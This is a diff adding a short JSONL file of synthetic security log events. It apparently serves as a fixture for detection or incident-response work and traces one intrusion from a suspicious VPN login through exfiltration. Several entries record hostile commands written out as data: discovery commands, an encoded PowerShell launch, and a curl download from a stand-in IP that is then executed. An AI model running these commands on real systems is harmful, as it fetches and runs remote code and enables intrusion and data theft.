@@ -1,0 +1,14 @@
+{"ts":"2026-04-20T08:00:00Z","source":"auth","host":"vpn-gateway","user":"alice","action":"login_success","ip":"198.51.100.10","country":"US","detail":"normal morning login"}
+{"ts":"2026-04-20T08:03:00Z","source":"auth","host":"vpn-gateway","user":"morgan","action":"login_failure","ip":"203.0.113.50","country":"RU","detail":"failed login from suspicious IP"}
+{"ts":"2026-04-20T08:04:12Z","source":"auth","host":"vpn-gateway","user":"morgan","action":"login_success","ip":"203.0.113.50","country":"RU","detail":"successful login after failure burst"}
+{"ts":"2026-04-20T08:06:30Z","source":"auth","host":"vpn-gateway","user":"morgan","action":"login_success","ip":"198.51.100.23","country":"US","detail":"second successful login from distant country within same window"}
+{"ts":"2026-04-20T08:08:00Z","source":"edr","host":"workstation-7","user":"morgan","action":"process_start","command":"cmd.exe /c whoami && hostname","detail":"interactive discovery commands"}
+{"ts":"2026-04-20T08:09:20Z","source":"edr","host":"workstation-7","user":"morgan","action":"process_start","command":"powershell -enc SQBFAFgA...","detail":"encoded PowerShell launch"}
+{"ts":"2026-04-20T08:10:05Z","source":"edr","host":"workstation-7","user":"morgan","action":"process_start","command":"curl http://203.0.113.50/payload.sh -o /tmp/payload.sh","detail":"download from suspicious IP"}
+{"ts":"2026-04-20T08:10:45Z","source":"edr","host":"workstation-7","user":"morgan","action":"process_start","command":"chmod +x /tmp/payload.sh && /tmp/payload.sh","detail":"payload execution"}
+{"ts":"2026-04-20T08:12:00Z","source":"system","host":"workstation-7","user":"root","action":"cron_write","path":"/etc/cron.d/syscheck","detail":"new cron persistence entry"}
+{"ts":"2026-04-20T08:13:30Z","source":"system","host":"workstation-7","user":"root","action":"service_install","service":"syscheck.service","detail":"service persistence installed"}
+{"ts":"2026-04-20T08:15:00Z","source":"filesystem","host":"workstation-7","user":"morgan","action":"archive_created","path":"/tmp/finance-q2.tgz","bytes":4928301,"detail":"archive staged in temp directory"}
+{"ts":"2026-04-20T08:16:20Z","source":"network","host":"workstation-7","user":"morgan","action":"large_upload","dest_ip":"203.0.113.50","bytes":4929000,"detail":"large outbound transfer to suspicious IP"}
+{"ts":"2026-04-20T08:19:00Z","source":"dns","host":"workstation-7","user":"morgan","action":"dns_tunnel","domain":"updates.example.invalid","detail":"high entropy DNS query burst"}
+{"ts":"2026-04-20T08:30:00Z","source":"auth","host":"vpn-gateway","user":"alice","action":"logout","ip":"198.51.100.10","country":"US","detail":"normal logout"}
